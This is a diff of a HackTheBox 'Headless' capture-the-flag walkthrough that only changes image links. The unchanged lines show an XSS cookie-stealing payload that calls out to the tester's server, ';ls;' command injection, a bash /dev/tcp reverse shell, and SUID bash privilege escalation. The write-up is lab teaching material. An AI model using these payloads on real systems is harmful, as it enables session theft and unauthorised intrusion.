@@ -1,5 +1,5 @@
 # <center> HEADLESS </center>
-<p align="center"><img src="../.medias/headless/headless_logo.png"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/headless_logo.png"></p>
 
 Hello homie! Today I'll be walking you through the easy labeled HackTheBox machine named 'Headless'.
 
@@ -151,14 +151,14 @@ Task Completed
 
  So here, all we have is:
  - A landing page with time being displayed on it in format day hour min sec
-    - ![landing page](../.medias/headless/landing_page.jpg). 
+    - ![landing page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/landing_page.jpg). 
 
 - support page with lots of input field.
-    - ![support page](../.medias/headless/support.jpg)
+    - ![support page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/support.jpg)
 
 - dashboard page which sets out cookies with user parameter and unauthorizes us.
-    - ![dashboard page](../.medias/headless/dashboard.jpg)
-    - ![cookie issue](../.medias/headless/cookie_issue.jpg)
+    - ![dashboard page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/dashboard.jpg)
+    - ![cookie issue](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/cookie_issue.jpg)
 
 
 
@@ -167,7 +167,7 @@ Task Completed
 Support page with input fields caught my interest, so, I started testing the input fields manually.
 - First tried for SQL injection, I gave single quote(') and double quotes(") as input to every input fields, but there was no any suspicious response.
 - Then I tried for XSS. I gave `<XSS>` (word XSS wrapped in angular bracket) as input and I got a suspisious looking message, which means the app is vulnerable to XSS.
-    - ![suspicious message](../.medias/headless/sus_response.jpg)
+    - ![suspicious message](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/sus_response.jpg)
 
 The message said that hacking attemp was detected so a report with my browser information was sent to administrator. 
 
@@ -186,23 +186,23 @@ First I started a http server using command `python -m httpserver`. It started a
 <svg onload='fetch("http://my_ip:port/" + document.cookie)>
 ```
 and sent the request. Within 5-6 seconds I recieved message with admin's cookie in my terminal.
-![obtaining admin cookie](../.medias/headless/obtaining_cookie.jpg)
+![obtaining admin cookie](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/obtaining_cookie.jpg)
 
 Now, using the admin cookie lets try to access the dashboard page and Voilà we got the administrator dashboard.
-![accessed administrator dashboard](../.medias/headless/accessed_dashboard.jpg)
+![accessed administrator dashboard](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/accessed_dashboard.jpg)
 
 Here we have option to generate report from the dashboard. Let's generate the report and intercept the request.
-![generating report](../.medias/headless/generate_report.jpg)
+![generating report](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/generate_report.jpg)
 
 Date parameter is sent using post request. So there could be the possibility of OS command injection if inputs are not validated properly.
 - first attemp, I concatenated the date parameter with `;ls` but didnot get expected result.
 - second try, then  I modified my payload as `;ls;` then I got the output exactly what I wished for 😍.
-![command injection worked!](../.medias/headless/command_injection.jpg)
+![command injection worked!](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/command_injection.jpg)
 
 
 -----------------
 from here You can easily grab the user flag by just exploring the file system and trying some different directories.
-![exploring files](../.medias/headless/exploring_files.jpg)
+![exploring files](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/exploring_files.jpg)
 
 But it is not the good way. It'd be better if we get a reverse shell first because gaining a reverse shell is the ideal thing in pentesting. So lets fire up a netcat listener on port 1234 and upload a reverse shell on victim machine.
 
@@ -212,10 +212,10 @@ echo "bash -i >& /dev/tcp/10.10.14.116/1234 0>&1;" > reverse_shell.sh
 chmod +x reverse_shell.sh
 ```
 step 2 => start the python server with `python -m http.server` and then use `wget http://<ipaddress>port/`to upload reverse shell on victim's machine.
-![upload reverse shell](../.medias/headless/upload_reverseshell.jpg)
+![upload reverse shell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/upload_reverseshell.jpg)
 
 Now since the reverse shell is uploaded, lets run the script using `bash reverse_shell.sh` command. We got the reverse shell. Now again exploring through the file system we can easily acquire the user flag.
-![user flag](../.medias/headless/user_flag.jpg)
+![user flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/user_flag.jpg)
 
 
 ## Privilege Escalation
@@ -299,10 +299,10 @@ SUID bit is set to user now by running `/bin/bash -p` when the binary has the SU
 
 From here we can escalate out previlege to root and tehn grab the root flag.
 
-![root flag](../.medias/headless/root_flag.jpg)
+![root flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/root_flag.jpg)
 
 Hurray! we successfully acquired the root flag 🤩.
 
 Thankyou for reading my writeup cum walkthrough. Hope this was really informative and interesting for you.
- ![headless pwned](../.medias/headless/headless_pwned.jpg)
+ ![headless pwned](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/headless/headless_pwned.jpg)
 
